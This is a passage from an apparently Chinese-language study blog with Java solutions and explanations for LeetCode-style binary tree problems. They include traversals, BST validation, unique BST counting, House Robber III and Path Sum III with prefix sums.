<span class="keyword">new</span> LinkedList&lt;Integer&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">        recur(root);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">recur</span><span class="params">(TreeNode root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        recur(root.left);</span><br><span class="line">        res.add(root.val);</span><br><span class="line">        recur(root.right);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>迭代法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//初始化</span></span><br><span class="line">    List&lt;Integer&gt; res = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">    TreeNode cur = root;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//遍历</span></span><br><span class="line">    <span class="keyword">while</span>(cur != <span class="keyword">null</span> || !stack.isEmpty())&#123;</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="keyword">null</span>)&#123;</span><br><span class="line">            stack.push(cur);</span><br><span class="line">            cur = cur.left;</span><br><span class="line">        &#125;</span><br><span class="line">        cur = stack.pop();</span><br><span class="line">        res.add(cur.val);</span><br><span class="line">        cur = cur.right;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考自leetcode颜色标记法：</p><p>兼具栈迭代方法的高效，又像递归方法一样简洁易懂，更重要的是，这种方法对于前序、中序、后序遍历，能够写出完全一致的代码。其核心思想如下：</p><ul><li>使用颜色标记节点的状态，新节点为白色，已访问的节点为灰色。</li><li>如果遇到的节点为白色，则将其标记为灰色，然后将其右子节点、自身、左子节点依次入栈。</li><li>如果遇到的节点为灰色，则将节点的值输出。</li></ul><p>使用这种方法实现的中序遍历如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ColorNode</span> </span>&#123;</span><br><span class="line">        TreeNode node;</span><br><span class="line">        String color;</span><br><span class="line">        </span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">ColorNode</span><span class="params">(TreeNode node,String color)</span></span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.node = node;</span><br><span class="line">            <span class="keyword">this</span>.color = color;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">inorderTraversal</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">            </span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        Stack&lt;ColorNode&gt; stack = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">        stack.push(<span class="keyword">new</span> ColorNode(root,<span class="string">&quot;white&quot;</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(!stack.empty())&#123;</span><br><span class="line">            ColorNode cn = stack.pop();</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(cn.color.equals(<span class="string">&quot;white&quot;</span>))&#123;</span><br><span class="line">                <span class="keyword">if</span>(cn.node.right != <span class="keyword">null</span>) stack.push(<span class="keyword">new</span> ColorNode(cn.node.right,<span class="string">&quot;white&quot;</span>));</span><br><span class="line">                stack.push(<span class="keyword">new</span> ColorNode(cn.node,<span class="string">&quot;gray&quot;</span>));</span><br><span class="line">                <span class="keyword">if</span>(cn.node.left != <span class="keyword">null</span>)stack.push(<span class="keyword">new</span> ColorNode(cn.node.left,<span class="string">&quot;white&quot;</span>));</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                res.add(cn.node.val);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如要实现前序、后序遍历，只需要调整左右子节点的入栈顺序即可。</p><h2 id="5-7-二叉树的层序遍历"><a href="#5-7-二叉树的层序遍历" class="headerlink" title="5.7 二叉树的层序遍历"></a>5.7 二叉树的层序遍历</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; levelOrder(TreeNode root) &#123;</span><br><span class="line">    Queue&lt;TreeNode&gt; queue = <span class="keyword">new</span> LinkedList&lt;TreeNode&gt;();</span><br><span class="line">    List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (root != <span class="keyword">null</span>)&#123;</span><br><span class="line">        queue.add(root);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">        List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = queue.size();i &gt; <span class="number">0</span>;i--)&#123;</span><br><span class="line">            TreeNode node = queue.poll();</span><br><span class="line">            list.add(node.val);</span><br><span class="line">            <span class="keyword">if</span> (node.left != <span class="keyword">null</span>)&#123;</span><br><span class="line">                queue.add(node.left);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (node.right != <span class="keyword">null</span>)&#123;</span><br><span class="line">                queue.add(node.right);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        res.add(list);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-8-重建二叉树"><a href="#5-8-重建二叉树" class="headerlink" title="5.8 重建二叉树"></a>5.8 重建二叉树</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">buildTree</span><span class="params">(<span class="keyword">int</span>[] preorder, <span class="keyword">int</span>[] inorder)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (preorder.length==<span class="number">0</span>||inorder.length==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">//递归出口</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        TreeNode root = <span class="keyword">new</span> TreeNode(preorder[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; inorder.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(preorder[<span class="number">0</span>] == inorder[i])&#123;</span><br><span class="line">                root.left = buildTree(Arrays.copyOfRange(preorder,<span class="number">1</span>,i+<span class="number">1</span>),Arrays.copyOfRange(inorder,<span class="number">0</span>,i));</span><br><span class="line">                root.right = buildTree(Arrays.copyOfRange(preorder,i+<span class="number">1</span>,preorder.length),Arrays.copyOfRange(inorder,i+<span class="number">1</span>,inorder.length));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="5-9-二叉树展开为链表"><a href="#5-9-二叉树展开为链表" class="headerlink" title="5.9 二叉树展开为链表"></a>5.9 二叉树展开为链表</h2><p>可以使用O(n)的格外空间来接收先序遍历得到的节点，题目的进阶要求为使用O(1)的额外空间，也就是在原来的树上作出改动。</p><p>观察发现满足递归特性，将左子树展开结果连接到根节点的右子节点，再连接右子树展开结果。但是递归也会使用O(n)栈空间</p><p>已知的额外空间为O(1)的遍历方法为Mirros算法，下面借助Mirros算法思想：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">flatten</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (root != <span class="keyword">null</span>) &#123; </span><br><span class="line">            <span class="keyword">if</span>(root.left == <span class="keyword">null</span>)&#123;</span><br><span class="line">                root = root.right;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                TreeNode pre = root.left;</span><br><span class="line">                <span class="keyword">while</span>(pre.right != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    pre = pre.right;</span><br><span class="line">                &#125;</span><br><span class="line">                pre.right = root.right;</span><br><span class="line">                root.right = root.left;</span><br><span class="line">                root.left = <span class="keyword">null</span>;</span><br><span class="line">                root = root.right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="5-10-二叉树的最近公共祖先"><a href="#5-10-二叉树的最近公共祖先" class="headerlink" title="5.10 二叉树的最近公共祖先"></a>5.10 二叉树的最近公共祖先</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="keyword">null</span> || root == p || root == q) &#123;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">        &#125;</span><br><span class="line">        TreeNode left = lowestCommonAncestor(root.left,p,q);</span><br><span class="line">        TreeNode right = lowestCommonAncestor(root.right,p,q);</span><br><span class="line">        <span class="keyword">if</span>(left == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> right;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(right == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="5-11-二叉树中的最大路径和"><a href="#5-11-二叉树中的最大路径和" class="headerlink" title="5.11 二叉树中的最大路径和"></a>5.11 二叉树中的最大路径和</h2><p>后序递归遍历，首先计算节点贡献值，节点贡献值=节点值 + Math.max(左节点贡献值 +,右节点贡献值)，最大路径和=Max{每个节点的左右贡献值(&gt;0) + 节点值}</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> maxSums = Integer.MIN_VALUE;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxPathSum</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">       maxGain(root);</span><br><span class="line">       <span class="keyword">return</span> maxSums;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="function"><span class="keyword">int</span> <span class="title">maxGain</span><span class="params">(TreeNode root)</span></span>&#123;</span><br><span class="line">       <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">int</span> leftNum = Math.max(maxGain(root.left),<span class="number">0</span>);</span><br><span class="line">       <span class="keyword">int</span> rightNum = Math.max(maxGain(root.right),<span class="number">0</span>);</span><br><span class="line">       <span class="keyword">int</span> grade = leftNum + rightNum + root.val;</span><br><span class="line">       maxSums = Math.max(maxSums,grade);</span><br><span class="line">       <span class="keyword">return</span> root.val + Math.max(leftNum,rightNum);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h2 id="5-12-验证二叉搜索树"><a href="#5-12-验证二叉搜索树" class="headerlink" title="5.12 验证二叉搜索树"></a>5.12 验证二叉搜索树</h2><p>两个思路： </p><ul><li>可以通过验证二叉树的中序序列如果是递增序列说明是二叉搜索树。</li><li>验证每个节点左子树都小于根节点值，右子树都大于根节点值，但是找出左子树中的最小值或找出右子树最大值并不容易，可以扩展参数列表让左子树的值不得超过root.val，右子树的值不得小于root.val。</li></ul><p>思路1：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> pre = Long.MIN_VALUE;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isValidBST</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!isValidBST(root.left))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pre &gt;= root.val)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pre = root.val;</span><br><span class="line">    <span class="keyword">return</span> isValidBST(root.right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路2：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isValidBST</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> helper(root,<span class="keyword">null</span>,<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">boolean</span> <span class="title">helper</span><span class="params">(TreeNode root,Integer minSum,Integer maxSum)</span></span>&#123;</span><br><span class="line">        <span class="comment">//递归出口</span></span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> val = root.val;</span><br><span class="line">        <span class="comment">//前序遍历</span></span><br><span class="line">        <span class="keyword">if</span>(minSum != <span class="keyword">null</span> &amp;&amp; val &lt;= minSum)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(maxSum != <span class="keyword">null</span> &amp;&amp; val &gt;= maxSum)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!helper(root.left,minSum,val))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!helper(root.right,val,maxSum))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-13-二叉搜索树转换为累加树"><a href="#5-13-二叉搜索树转换为累加树" class="headerlink" title="5.13 二叉搜索树转换为累加树"></a>5.13 二叉搜索树转换为累加树</h2><p>题目要求使每个节点 <code>node</code> 的新值等于原树中大于或等于 <code>node.val</code> 的值之和。相当于是二叉搜索树的中序逆序遍历，每次遍历到一个节点加上上一个节点就好。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> TreeNode <span class="title">convertBST</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">        inOrderTraverse(root);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">inOrderTraverse</span><span class="params">(TreeNode root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        inOrderTraverse(root.right);</span><br><span class="line">        root.val += sum;</span><br><span class="line">        sum = root.val;</span><br><span class="line">        inOrderTraverse(root.left);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="5-14-不同的二叉搜索树"><a href="#5-14-不同的二叉搜索树" class="headerlink" title="5.14 不同的二叉搜索树"></a>5.14 不同的二叉搜索树</h2><p>难点在于推出公式而不是动态规划</p><p>题目要求是计算不同二叉搜索树的个数。为此，我们可以定义两个函数：</p><ol><li>$G(n)$: 长度为 n 的序列能构成的不同二叉搜索树的个数。</li><li>$F(i, n)$: 以 i 为根、序列长度为 n 的不同二叉搜索树个数 $(1≤i≤n)$。</li></ol><p>有以下关系：</p><script type="math/tex; mode=display">G(n)= \sum_{n=1}^n F(i,n)\qquad \qquad(1)</script><p>举例而言，创建以 3 为根、长度为 7 的不同二叉搜索树，整个序列是 $[1, 2, 3, 4, 5, 6, 7]$，我们需要从左子序列 $[1,2]$ 构建左子树，从右子序列 $[4, 5, 6, 7]$ 构建右子树，然后将它们组合（即笛卡尔积）。</p><p>对于这个例子，不同二叉搜索树的个数为 $F(3, 7)$。我们将 $[1,2]$ 构建不同左子树的数量表示为G(2), 从$ [4, 5, 6, 7]$ 构建不同右子树的数量表示为 G(4)，注意到 G(n) 和序列的内容无关，只和序列的长度有关。于是，$F(3,7) = G(2) \cdot G(4)$。 因此，我们可以得到以下公式：</p><script type="math/tex; mode=display">F(i, n) = G(i-1) \cdot G(n-i) \qquad \qquad (2)</script><p>将公式 (1)，(2) 结合，可以得到 G(n) 的递归表达式：</p><script type="math/tex; mode=display">G(n) = \sum_{i=1}^{n}G(i-1) \cdot G(n-i) \qquad \qquad (3)</script><p>至此，我们从小到大计算 G 函数即可，因为G(n) 的值依赖于 $G(0) \cdots G(n-1)$。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numTrees</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] res = <span class="keyword">new</span> <span class="keyword">int</span>[n + <span class="number">1</span>];</span><br><span class="line">    res[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    res[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= i; j++)&#123;</span><br><span class="line">            res[i] += res[j - <span class="number">1</span>] * res[i - j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-15-打家劫舍-Ⅲ"><a href="#5-15-打家劫舍-Ⅲ" class="headerlink" title="5.15 打家劫舍 Ⅲ"></a>5.15 打家劫舍 Ⅲ</h2><p>树形dp，对于常见的动态规划遍历的状态是数组，可以采用自顶向下的递归遍历和自底向上的迭代遍历。而树形dp使用递归遍历比较方便。</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">    <span class="number">3</span></span><br><span class="line">   / \</span><br><span class="line">  <span class="number">2</span>   <span class="number">3</span></span><br><span class="line">   \   \ </span><br><span class="line">    <span class="number">3</span>   <span class="number">1</span></span><br><span class="line">重叠的子问题在于选root下一步会递归root.<span class="built_in">left</span>.<span class="built_in">right</span></span><br><span class="line">不选递归root.<span class="built_in">left</span>以后，root.<span class="built_in">left</span>不选又递归root.<span class="built_in">left</span>.<span class="built_in">right</span></span><br></pre></td></tr></table></figure><p>代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;TreeNode, Integer&gt; memo = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">rob</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(memo.containsKey(root))&#123;</span><br><span class="line">        <span class="keyword">return</span> memo.get(root);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> value_do = root.val </span><br><span class="line">    + (root.left == <span class="keyword">null</span> ? <span class="number">0</span> : rob(root.left.left) + rob(root.left.right))</span><br><span class="line">    + (root.right == <span class="keyword">null</span> ? <span class="number">0</span> : rob(root.right.left) + rob(root.right.right));</span><br><span class="line">    <span class="keyword">int</span> value_not = rob(root.left) + rob(root.right);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> res = Math.max(value_do, value_not);</span><br><span class="line">    memo.put(root, res);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="5-16-路径总和Ⅲ"><a href="#5-16-路径总和Ⅲ" class="headerlink" title="5.16 路径总和Ⅲ"></a>5.16 路径总和Ⅲ</h2><p>回溯+前缀和</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// key是前缀和, value是大小为key的前缀和出现的次数</span></span><br><span class="line"> Map&lt;Integer, Integer&gt; prefixSumCount = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">pathSum</span><span class="params">(TreeNode root, <span class="keyword">int</span> sum)</span> </span>&#123;</span><br><span class="line">     <span class="comment">// 前缀和为0的一条路径</span></span><br><span class="line">     prefixSumCount.put(<span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">     <span class="comment">// 前缀和的递归回溯</span></span><br><span class="line">     <span class="keyword">return</span> recursionPathSum(root, sum, <span class="number">0</span>);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">recursionPathSum</span><span class="params">(TreeNode node, <span class="keyword">int</span> target, <span class="keyword">int</span> currSum)</span> </span>&#123;</span><br><span class="line">     <span class="comment">// 1.递归终止条件</span></span><br><span class="line">     <span class="keyword">if</span> (node == <span class="keyword">null</span>) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="comment">// 2.本层要做的事情</span></span><br><span class="line">     <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">     <span class="comment">// 当前路径上的和</span></span><br><span class="line">     currSum += node.val;</span><br><span class="line"></span><br><span class="line">     <span class="comment">// currSum-target相当于找路径的起点，起点的sum+target=currSum，当前点到起点的距离就是target</span></span><br><span class="line">     res += prefixSumCount.getOrDefault(currSum - target, <span class="number">0</span>);</span><br><span class="line">     <span class="comment">// 更新路径上当前节点前缀和的个数</span></span><br><span class="line">     prefixSumCount.put(currSum, prefixSumCount.getOrDefault(currSum, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">     <span class="comment">// 3.进入下一层</span></span><br><span class="line">     res 